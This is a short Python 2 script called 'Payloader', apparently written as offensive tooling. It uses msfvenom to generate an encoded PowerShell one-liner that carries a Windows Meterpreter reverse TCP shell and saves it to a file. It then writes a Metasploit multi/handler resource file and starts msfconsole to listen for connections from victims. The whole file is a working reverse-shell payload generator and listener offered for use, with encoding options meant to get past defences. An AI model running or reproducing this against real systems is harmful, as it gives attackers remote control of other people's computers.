#!/usr/bin/env python
# Payloader v1
# creates Powershell onliner Psh-cmd meterpreter reverse tcp shell
# This simple script will be updated to include more outputs
# @SyFi2k



import os, random, sys, subprocess, requests

try:

	LHOST = 'LHOST=' + str(sys.argv[1])
	LPORT = 'LPORT=' + str(sys.argv[2])
	PAYLOAD = 'windows/meterpreter/reverse_tcp'
	HANDLER = sys.argv[3]

except IndexError:
   
	print "______           _                 _           "
	print "| ___ \         | |               | |          "
	print "| |_/ /_ _ _   _| | ___   __ _  __| | ___ _ __ "
	print "|  __/ _` | | | | |/ _ \ / _` |/ _` |/ _ \ '__|"
	print "| | | (_| | |_| | | (_) | (_| | (_| |  __/ |   "
	print "\_|  \__,_|\__, |_|\___/ \__,_|\__,_|\___|_|   "
	print "            __/ |                              "
	print "           |___/  "
	print "		By @SyFi2k"
	print '\n'
	print "Usage: %s LHOST LPORT RunHandler" % sys.argv[0]
	print "Example: %s 192.168.13.37 31337 Y" % sys.argv[0]
	sys.exit()

def generate_payload(LHOST, LPORT, PAYLOAD):

	
	print "[+] Checking Msfvenom Path.."
	if "msfvenom" in os.listdir("/usr/local/bin/"): #CHANGE HERE 
		print "[+] msfvenom found"
	else:
		print "[-] msfvenom not installed\n"
		print "[*] if msfvenom installed please change dir path in the source"
		sys.exit()
	

	print "[+] Generating Powershell Psh-cmd onliner meterpreter"
	payloader = subprocess.Popen(
		['msfvenom', '-p', PAYLOAD, LHOST, LPORT,
		'ExitOnSession=false', 'EnableStageEncoding=true', 'EnableUnicodeEncoding=true', '-f', 'psh-cmd'], stdout=subprocess.PIPE).communicate()[0]
	
	output = open('payload.txt', 'w')
	output.write(payloader)
	output.write("\n")
	output.close()


def handler(LHOST, LPORT, PAYLOAD):

	print "[+] Launching handler with .rc"
	handler = "use exploit/multi/handler\n"
	handler += "set PAYLOAD %s\n" % PAYLOAD
	handler += "set LHOST %s\n" % LHOST.lstrip('LHOST=')
	handler += "set LPORT %s\n" % LPORT.lstrip('LPORT=')
	handler += "load sounds\n"
	handler += "set ExitOnSession false\n"
	handler += "set EnableStageEncoding true\n"
	handler += "set EnableUnicodeEncoding true\n"
	handler += "exploit -j\n"
	handler_file = open('payloader.rc', 'w')
	handler_file.write(handler)
	handler_file.close()
	os.system("msfconsole -r payloader.rc")


generate_payload(LHOST, LPORT, PAYLOAD)
if HANDLER == 'Y':
	handler(LHOST, LPORT, PAYLOAD)
else:
	sys.exit()

